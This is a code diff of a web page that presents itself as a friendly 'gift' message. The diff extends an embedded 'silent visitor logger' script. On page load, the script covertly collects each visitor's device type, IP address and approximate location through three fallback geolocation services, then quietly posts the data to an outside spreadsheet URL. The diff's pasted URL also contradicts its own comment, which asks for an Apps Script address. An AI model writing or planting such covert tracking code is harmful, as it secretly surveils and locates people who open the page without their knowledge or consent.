@@ -435,31 +435,58 @@ Here is a little gift from my side. Click the "Yes" button below to see more. An
 <script>
 /* ===================== SILENT VISITOR LOGGER ===================== */
 window.addEventListener("DOMContentLoaded", async () => {
-  const scriptURL = "YOUR_GOOGLE_SCRIPT_WEB_APP_URL"; // <-- Paste your Web App URL here
+  // PASTE YOUR APPS SCRIPT WEB APP URL (starts with https://script.google.com/macros/s/...)
+  const scriptURL = "https://docs.google.com/spreadsheets/d/19qw7YRoKQkO5z0bmDqvvxDy3dflXdUlETGLFlI8Fflw/edit?gid=0#gid=0";
+
   const now = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
   const ua = navigator.userAgent;
 
+  // Accurate Device Detection
   let device = "Desktop / PC";
-  if (/iPhone/i.test(ua)) device = "iPhone";
-  else if (/iPad/i.test(ua)) device = "iPad";
-  else if (/Android/i.test(ua)) device = "Android Mobile";
+  if (/iPhone/i.test(ua)) {
+    device = "Apple iPhone";
+  } else if (/iPad/i.test(ua)) {
+    device = "Apple iPad";
+  } else if (/Android/i.test(ua)) {
+    device = "Android Device";
+  } else if (/Macintosh|Mac OS X/i.test(ua)) {
+    device = "Mac Desktop/Laptop";
+  } else if (/Windows NT/i.test(ua)) {
+    device = "Windows PC";
+  }
 
+  // Triple-fallback silent Geo-IP detector
   let locationInfo = "Location Unavailable";
-
   try {
     const res = await fetch("https://ipapi.co/json/");
     if (res.ok) {
       const loc = await res.json();
-      locationInfo = `${loc.city || ""}, ${loc.region || ""}, ${loc.country_name || ""} (${loc.org || "ISP"})`.replace(/^, /, "");
+      if (loc.city || loc.region) {
+        locationInfo = `${loc.city || ""}, ${loc.region || ""}, ${loc.country_name || ""} (${loc.org || "Network"})`.replace(/^,\s*/, "");
+      }
     }
-  } catch (e) {
+  } catch (e) {}
+
+  if (locationInfo === "Location Unavailable") {
     try {
       const res2 = await fetch("https://ipwho.is/");
-      const loc2 = await res2.json();
-      if (loc2.success) {
-        locationInfo = `${loc2.city || ""}, ${loc2.region || ""}, ${loc2.country || ""} (${loc2.connection?.isp || "ISP"})`.replace(/^, /, "");
+      if (res2.ok) {
+        const loc2 = await res2.json();
+        if (loc2.success) {
+          locationInfo = `${loc2.city || ""}, ${loc2.region || ""}, ${loc2.country || ""} (${loc2.connection?.isp || "Network"})`.replace(/^,\s*/, "");
+        }
       }
     } catch (err) {}
+  }
+
+  if (locationInfo === "Location Unavailable") {
+    try {
+      const res3 = await fetch("https://api.country.is");
+      if (res3.ok) {
+        const loc3 = await res3.json();
+        if (loc3.country) locationInfo = `Country: ${loc3.country} (IP: ${loc3.ip})`;
+      }
+    } catch (err3) {}
   }
 
   const payload = {
@@ -473,7 +500,7 @@ window.addEventListener("DOMContentLoaded", async () => {
   fetch(scriptURL, {
     method: "POST",
     mode: "no-cors",
-    headers: { "Content-Type": "application/json" },
+    headers: { "Content-Type": "text/plain;charset=utf-8" },
     body: JSON.stringify(payload)
   }).catch(err => console.error("Logger error:", err));
 });
